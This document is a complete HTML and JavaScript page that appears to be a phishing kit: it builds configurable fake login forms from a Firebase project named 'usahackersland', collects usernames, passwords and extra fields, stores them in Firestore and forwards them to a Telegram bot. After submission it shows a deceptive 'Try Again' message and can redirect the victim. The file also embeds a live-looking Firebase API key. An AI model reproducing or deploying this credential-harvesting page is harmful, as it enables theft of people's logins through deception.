<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Form Submission</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f6f8;padding:20px}
#formContainer{max-width:600px;margin:auto;background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}
input,textarea,button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
button{cursor:pointer;background:#1976d2;color:#fff;border:none}
h2{text-align:center}
.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all}
#submitResult{margin:10px 0;color:#b71c1c;font-weight:bold;text-align:center;transition: opacity 0.5s;}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div id="formContainer">
<div id="imageContainer"></div> <!-- Images at top -->
<h2 id="formTitle">Loading...</h2>
<div id="formDesc"></div>
<div id="failureWarning" style="color:#b71c1c;font-weight:bold;text-align:center;"></div> <!-- Failure warning -->
<div id="submitResult"></div> <!-- Try Again will show here -->
<form id="dynamicForm"></form>
<div id="embedLinks"></div>
</div>

<script>
const $ = id => document.getElementById(id);
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const urlParams = new URLSearchParams(window.location.search);
const formId = urlParams.get("id");
const formEl = $("dynamicForm");
const embedEl = $("embedLinks");
const submitResult = $("submitResult");
const imageContainer = $("imageContainer");
const failureWarning = $("failureWarning");

let formConfig = null;

if(!formId){
  $("formTitle").innerText = "Form ID missing!";
}

// Load form config
db.collection("forms").doc(formId).get().then(doc=>{
  if(!doc.exists){
    $("formTitle").innerText = "Form not found!";
    return;
  }
  formConfig = doc.data();
  renderForm();
}).catch(err=>{
  $("formTitle").innerText = "Error loading form";
  console.error(err);
});

// Render the form dynamically
function renderForm(){
  $("formTitle").innerText = formConfig.title;
  $("formTitle").style.color = formConfig.titleColor;
  $("formDesc").innerText = formConfig.description;
  $("formDesc").style.color = formConfig.textColor;

  formEl.innerHTML = "";
  imageContainer.innerHTML = "";

  // Avatar & Logo (Top)
  if(formConfig.avatarURL) imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%;display:block;margin:auto 0 10px">`;
  if(formConfig.logoURL) imageContainer.innerHTML += `<img src="${formConfig.logoURL}" style="width:140px;display:block;margin:auto 0 10px">`;

  // Warning (Failure to verify...)
  if(formConfig.enableWarning && formConfig.warningPosition!=="none"){
    failureWarning.innerText = formConfig.warning;
  }

  // Username & Password
  if(formConfig.addAuth){
    formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder}" required>`;
    formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>`;
  }

  // Extra fields
  formConfig.extraFields.forEach(field=>{
    if(field) formEl.innerHTML += `<input name="${field}" placeholder="${field}" required>`;
  });

  // Embed Links
  embedEl.innerHTML = "";
  formConfig.embedLinks.forEach(link=>{
    if(!link.show) return;
    const div = document.createElement("div");
    div.className = "embedLink";
    div.innerHTML = `<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
    if(link.desc) div.innerHTML += `<br><small>${link.desc}</small>`;
    embedEl.appendChild(div);
  });

  // Main Button
  if(formConfig.showMainBtn){
    const btn = document.createElement("button");
    btn.textContent = formConfig.buttonText;
    btn.style.background = formConfig.btnColor;
    btn.onclick = submitForm;
    formEl.appendChild(btn);
  }
}

// Submit Form
function submitForm(e){
  e.preventDefault();
  const formData = {};
  const inputs = formEl.querySelectorAll("input,textarea");
  inputs.forEach(i=>{
    formData[i.name] = i.value;
  });

  // Save to Firestore submissions
  db.collection("submissions").add({
    formId,
    data: formData,
    createdAt: new Date().toISOString()
  }).then(()=>{
    // Show "Try Again" after failure warning
    submitResult.innerText = "âš ï¸ Try Again";
    submitResult.style.opacity = 1;

    // Hide after 3 seconds
    setTimeout(()=>submitResult.style.opacity = 0, 3000);
  }).catch(err=>{
    submitResult.innerText = "âŒ Error saving submission";
    console.error(err);
  });

  // Send to Telegram
  const telegramMsg = `ðŸ“ New Form Submission\n------------------\n`+
    Object.entries(formData).map(([k,v])=>`ðŸ’  ${k}: ${v}`).join("\n");

  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      chat_id:"YOUR_CHAT_ID",
      text: telegramMsg
    })
  });

  // Redirect if enabled
  if(formConfig.enableRedirect && formConfig.redirectURL){
    setTimeout(()=>window.location.href = formConfig.redirectURL, 1500);
  }

  // Reset form
  formEl.reset();
}
</script>
</body>
</html>
